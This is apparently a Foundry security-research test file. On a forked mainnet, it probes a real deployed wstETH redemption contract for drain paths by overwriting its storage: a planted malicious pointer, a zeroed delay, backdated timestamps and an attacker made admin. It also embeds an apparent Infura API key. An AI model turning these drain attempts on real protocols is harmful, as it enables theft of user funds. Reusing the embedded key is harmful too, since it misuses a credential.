// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/**
 * R0 DELEGATECALL CONTEXT INVESTIGATION
 *
 * KEY INSIGHT: R0 DELEGATECALLs to RC
 * This means RC reads R0's storage, not RC's storage!
 *
 * So when we modified RC slot 5, it had no effect because
 * the delegatecall reads R0 slot 5 instead.
 */
contract R0DelegatecallContext is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_CompareR0AndRCStorageSlot5() public {
        console.log("=== COMPARE R0 AND RC SLOT 5 ===\n");

        bytes32 r0Slot5 = vm.load(R0, bytes32(uint256(5)));
        bytes32 rcSlot5 = vm.load(RC, bytes32(uint256(5)));

        console.log("R0 slot 5:");
        console.logBytes32(r0Slot5);
        console.log("R0 slot 5 as address:", address(uint160(uint256(r0Slot5))));

        console.log("\nRC slot 5:");
        console.logBytes32(rcSlot5);
        console.log("RC slot 5 as address:", address(uint160(uint256(rcSlot5))));

        // Check if the address at R0 slot 5 has code
        address r0Slot5Addr = address(uint160(uint256(r0Slot5)));
        console.log("\nR0 slot 5 address code size:", r0Slot5Addr.code.length);

        // KEY: If R0 uses delegatecall to RC, RC's slot 5 read becomes R0's slot 5
        // So IAU in the context of delegatecall is R0.slot[5], not RC.slot[5]
    }

    function test_FullR0StorageComparison() public {
        console.log("=== FULL R0 vs RC STORAGE ===\n");

        console.log("Slot | R0 | RC");
        console.log("-----|----|----|");

        for (uint i = 0; i < 10; i++) {
            bytes32 r0Slot = vm.load(R0, bytes32(i));
            bytes32 rcSlot = vm.load(RC, bytes32(i));

            if (uint256(r0Slot) != 0 || uint256(rcSlot) != 0) {
                console.log("Slot %d:", i);
                console.log("  R0:");
                console.logBytes32(r0Slot);
                console.log("  RC:");
                console.logBytes32(rcSlot);
            }
        }
    }

    function test_ModifyR0Slot5() public {
        console.log("=== MODIFY R0 SLOT 5 (IAU in delegatecall context) ===\n");

        // Deploy malicious IAU
        MaliciousIAU malicious = new MaliciousIAU();
        console.log("Malicious IAU:", address(malicious));

        // Original R0 slot 5
        bytes32 originalSlot5 = vm.load(R0, bytes32(uint256(5)));
        console.log("Original R0 slot 5:");
        console.logBytes32(originalSlot5);

        // Modify R0 slot 5 to point to malicious IAU
        vm.store(R0, bytes32(uint256(5)), bytes32(uint256(uint160(address(malicious)))));

        bytes32 newSlot5 = vm.load(R0, bytes32(uint256(5)));
        console.log("New R0 slot 5:");
        console.logBytes32(newSlot5);

        // Now try to redeem via R0
        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        console.log("\nTrying R0.redeem with modified IAU in context...");
        (bool s1,) = R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("R0.redeem success:", s1);

        // Check if redemption created
        (bool s2, bytes memory d2) = R0.staticcall(
            abi.encodeWithSignature("getRedeemLength(address)", attacker)
        );
        if (s2 && d2.length > 0) {
            uint256 count = abi.decode(d2, (uint256));
            console.log("Redemption count:", count);
        }

        // Try immediate finalize
        (bool s3,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("Immediate finalize:", s3);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_ModifyR0DelaySlot() public {
        console.log("=== MODIFY R0 DELAY SLOT ===\n");

        // Slot 4 contains the delay at offset 96 bits
        bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
        console.log("Original R0 slot 4:");
        console.logBytes32(slot4);

        // Extract current delay
        uint256 delay = (uint256(slot4) >> 96) & type(uint32).max;
        console.log("Current delay:", delay / 86400, "days");

        // Create new slot4 with delay = 0
        // Keep other values, just zero the delay portion (bits 96-127)
        uint256 newSlot4Value = uint256(slot4) & ~(uint256(type(uint32).max) << 96);
        vm.store(R0, bytes32(uint256(4)), bytes32(newSlot4Value));

        bytes32 modifiedSlot4 = vm.load(R0, bytes32(uint256(4)));
        console.log("Modified R0 slot 4:");
        console.logBytes32(modifiedSlot4);

        uint256 newDelay = (uint256(modifiedSlot4) >> 96) & type(uint32).max;
        console.log("New delay:", newDelay, "seconds");

        // Now try redemption with 0 delay
        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create redemption
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("Created redemption");

        // Immediate finalize (no waiting!)
        (bool s1,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("Immediate finalize:", s1);

        vm.stopPrank();

        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
        console.log("Attacker wstETH:", attackerBal / 1e18);

        if (attackerBal > 0) {
            console.log("\n*** IMMEDIATE DRAIN WITH MODIFIED DELAY! ***");
        }
    }

    function test_ModifyR0TimestampInRedemption() public {
        console.log("=== MODIFY REDEMPTION TIMESTAMP ===\n");

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create redemption
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("Created redemption at timestamp:", block.timestamp);

        vm.stopPrank();

        // Find the redemption struct in storage
        // User redemptions are stored in a mapping at some slot
        // mapping(address => RedemptionRequest[])

        // Try to find the mapping base slot
        // keccak256(abi.encode(attacker, baseSlot))
        for (uint baseSlot = 0; baseSlot < 30; baseSlot++) {
            bytes32 arraySlot = keccak256(abi.encode(attacker, baseSlot));
            bytes32 arrayLength = vm.load(R0, arraySlot);

            if (uint256(arrayLength) > 0 && uint256(arrayLength) < 1000) {
                console.log("Found array at base slot %d, length: %d", baseSlot, uint256(arrayLength));

                // First element is at keccak256(arraySlot)
                bytes32 elem0Slot = keccak256(abi.encode(arraySlot));
                bytes32 elem0 = vm.load(R0, elem0Slot);
                console.log("Element 0:");
                console.logBytes32(elem0);

                // Try to decode timestamp
                uint256 storedTimestamp = uint256(elem0) & type(uint32).max;
                console.log("Stored timestamp:", storedTimestamp);
                console.log("Current timestamp:", block.timestamp);

                // Modify timestamp to be in the past
                uint256 pastTimestamp = block.timestamp - 8 days;
                uint256 newElem0 = (uint256(elem0) & ~uint256(type(uint32).max)) | pastTimestamp;
                vm.store(R0, elem0Slot, bytes32(newElem0));

                console.log("Modified timestamp to:", pastTimestamp);

                // Try to finalize now
                vm.startPrank(attacker);
                (bool success,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
                console.log("Finalize success:", success);
                vm.stopPrank();

                console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
                break;
            }
        }
    }

    function test_FindRedemptionMappingSlot() public {
        console.log("=== FIND REDEMPTION MAPPING SLOT ===\n");

        deal(TASSET, attacker, 10000e18);

        // Get storage before
        bytes32[] memory before = new bytes32[](50);
        for (uint i = 0; i < 50; i++) {
            before[i] = vm.load(R0, bytes32(i));
        }

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        // Get storage after
        console.log("Storage changes after redeem:");
        for (uint i = 0; i < 50; i++) {
            bytes32 afterVal = vm.load(R0, bytes32(i));
            if (before[i] != afterVal) {
                console.log("Slot %d changed:", i);
                console.log("  Before:");
                console.logBytes32(before[i]);
                console.log("  After:");
                console.logBytes32(afterVal);
            }
        }

        // Also check mapping slots for attacker
        console.log("\nChecking mapping slots for attacker...");
        for (uint baseSlot = 0; baseSlot < 50; baseSlot++) {
            bytes32 mappingSlot = keccak256(abi.encode(attacker, baseSlot));
            bytes32 value = vm.load(R0, mappingSlot);
            if (uint256(value) > 0 && uint256(value) < type(uint64).max) {
                console.log("Found non-zero at mapping base %d:", baseSlot);
                console.logBytes32(value);
            }
        }
    }

    function test_DirectStorageAttack() public {
        console.log("=== DIRECT STORAGE ATTACK ===\n");

        // If we can write to R0's storage, what's the most valuable slot?

        // 1. Modify paused state (if paused = unpause)
        // 2. Modify delay to 0
        // 3. Modify admin/owner to attacker
        // 4. Modify vault address to attacker

        // Let's see what slot 0 (usually owner/admin) contains
        bytes32 slot0 = vm.load(R0, bytes32(uint256(0)));
        console.log("R0 slot 0 (admin?):");
        console.logBytes32(slot0);
        address slot0Addr = address(uint160(uint256(slot0)));
        console.log("As address:", slot0Addr);
        console.log("Is timelock:", slot0Addr == TIMELOCK);

        // What if we could become the admin?
        vm.store(R0, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));
        console.log("\nMade attacker the admin");

        // Try admin functions
        vm.startPrank(attacker);

        // setDelay(0)
        (bool s1,) = R0.call(abi.encodeWithSignature("setDelay(uint256)", 0));
        console.log("setDelay(0):", s1);

        // withdraw
        (bool s2,) = R0.call(abi.encodeWithSignature("withdraw(uint256,address)", type(uint256).max, attacker));
        console.log("withdraw:", s2);

        // emergencyWithdraw
        (bool s3,) = R0.call(abi.encodeWithSignature("emergencyWithdraw(address)", attacker));
        console.log("emergencyWithdraw:", s3);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }
}

contract MaliciousIAU {
    fallback() external {
        assembly {
            mstore(0, 1)
            return(0, 32)
        }
    }
}
